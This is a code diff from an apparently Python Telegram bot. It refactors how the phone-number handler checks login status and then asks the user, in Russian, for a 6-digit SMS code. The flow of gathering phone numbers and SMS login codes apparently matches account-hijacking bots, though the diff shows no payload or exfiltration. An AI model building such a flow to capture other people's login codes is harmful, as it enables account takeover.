@@ -152,40 +152,27 @@ async def phone_handler(message: types.Message, state: FSMContext):
             logging.getLogger().removeHandler(handler)
 
     asyncio.ensure_future(auth_task())
-    await asyncio.sleep(5)
 
-    if uid not in pending:
-        return
-
-    status = pending[uid].get("status", "")
-
-    if status == "flood_sms":
-        await safe_edit(msg, "⏳ Слишком много попыток. Попробуйте позже.")
-        del pending[uid]
-        await state.clear()
-        return
-    elif status == "blocked":
-        await safe_edit(msg, "🚫 Аккаунт заблокирован или удалён.")
-        del pending[uid]
-        await state.clear()
-        return
-    elif status and status.startswith("error:"):
-        await safe_edit(msg, f"❌ {status[6:]}")
-        del pending[uid]
-        await state.clear()
-        return
-
-    await safe_edit(msg, "✅ SMS отправлена. Введи код из 6 цифр:")
-
-    # Дополнительная проверка через 15 секунд
-    async def delayed_check():
-        await asyncio.sleep(15)
-        if uid in pending and pending[uid].get("status") == "flood_sms":
+    async def status_watcher():
+        await asyncio.sleep(3)
+        if uid not in pending:
+            return
+        status = pending[uid].get("status", "")
+        if status == "flood_sms":
             await safe_edit(msg, "⏳ Слишком много попыток. Попробуйте позже.")
             del pending[uid]
             await state.clear()
+        elif status == "blocked":
+            await safe_edit(msg, "🚫 Аккаунт заблокирован или удалён.")
+            del pending[uid]
+            await state.clear()
+        elif status and status.startswith("error:"):
+            await safe_edit(msg, f"❌ {status[6:]}")
+            del pending[uid]
+            await state.clear()
 
-    asyncio.ensure_future(delayed_check())
+    asyncio.ensure_future(status_watcher())
+    await safe_edit(msg, "✅ SMS отправлена. Введи код из 6 цифр:")
 
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
 async def code_handler(message: types.Message, state: FSMContext):
